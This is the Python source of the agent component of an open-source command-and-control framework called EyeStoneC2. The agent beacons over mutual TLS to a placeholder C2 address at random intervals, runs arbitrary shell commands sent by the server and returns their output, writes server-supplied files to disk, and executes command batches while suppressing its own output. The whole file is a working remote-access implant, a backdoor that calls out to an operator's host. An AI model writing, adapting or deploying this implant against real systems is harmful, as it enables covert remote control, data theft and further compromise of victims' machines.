
# EyeStoneC2 - Command & Control framework
# Copyright (C) 2025 Gabriel Pérez Navarro

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

#!/usr/bin/env python3

import sys
import os
import socket
import time 
import subprocess
import platform
import random
import ssl
from ctypes import *
from contextlib import redirect_stdout, redirect_stderr

C2_SERVER_IP = "IP_PLACEHOLDER"
C2_SERVER_PORT = PORT_PLACEHOLDER



def download_file(client_socket):

    client_socket.sendall("download:req:path".encode())

    dst_path = client_socket.recv(1024).decode()

    client_socket.sendall("download:req:data".encode())

    file_data = client_socket.recv(8192)

    try:

        with open(dst_path, 'wb') as dst_file:

            dst_file.write(file_data)

        client_socket.sendall("download:ok".encode())

    except (FileNotFoundError):

        client_socket.sendall("download:err:path_not_found".encode())

    except (IsADirectoryError):

        client_socket.sendall("download:err:invalid_path".encode())


def exec_command_file(client_socket):

    client_socket.sendall("command_file:req:commands".encode())

    command_list = client_socket.recv(8192).decode().strip().split('\n')

    success = True

    for command in command_list:

        if not command:
            continue

        output = subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if output.returncode != 0:

            success = False

    if success == True:
        
        client_socket.sendall("command_file:exec:success".encode())

    else:

        client_socket.sendall("command_file:exec:fail".encode())



def get_os():

    libc = CDLL('libc.so.6')
    class uname_struct(Structure):
        _fields_ = [ ('sysname', c_char * 65),
                    ('nodename', c_char * 65),
                    ('release', c_char * 65),
                    ('version', c_char * 65),
                    ('machine', c_char * 65),
                    ('domain', c_char * 65) ]

    buffer = uname_struct()
    libc.uname(byref(buffer))

    return bytes(buffer)


def main():

    installed = True

    while installed == True:

        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.load_cert_chain(certfile=f"/opt/agent.crt", keyfile=f"/opt/agent.key")
        context.load_verify_locations(cafile='/opt/ca.crt')

        client_socket_unsecured = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        client_socket = context.wrap_socket(client_socket_unsecured, server_hostname='EyeStoneServer')

        try:
            beacon_server(client_socket)

            while True:
            
                command = client_socket.recv(8192).decode().strip()

                if command == 'agent:detach':

                    installed = False

                    break

                elif command == 'agent:remove':

                    break

                elif command == 'getinfo:system':

                    output = get_os()

                    client_socket.sendall(output)

                elif command == 'data:download':

                    download_file(client_socket)

                elif command == 'data:command_file':

                    exec_command_file(client_socket)

                else:
                    output = subprocess.run(command, shell=True, capture_output=True)

                    if output.stdout.decode():
                        client_socket.sendall(output.stdout)

                    if output.stderr.decode():
                        client_socket.sendall(output.stderr)

                    if not output.stdout and not output.stderr:

                        client_socket.sendall("output:none".encode())

            client_socket.shutdown(socket.SHUT_RDWR)

            client_socket.close()


        except:

            client_socket.shutdown(socket.SHUT_RDWR)

            client_socket.close()

    sys.exit(0)


def beacon_server(client_socket):

    while True:

        random_int = random.randint(1, 3)

        time.sleep(random_int*60)

        try:

            client_socket.connect((C2_SERVER_IP,C2_SERVER_PORT))

            return

        except:

            continue


if __name__ == "__main__":

    with open(os.devnull, 'w') as devnull:
        with redirect_stdout(devnull), redirect_stderr(devnull):
            main()






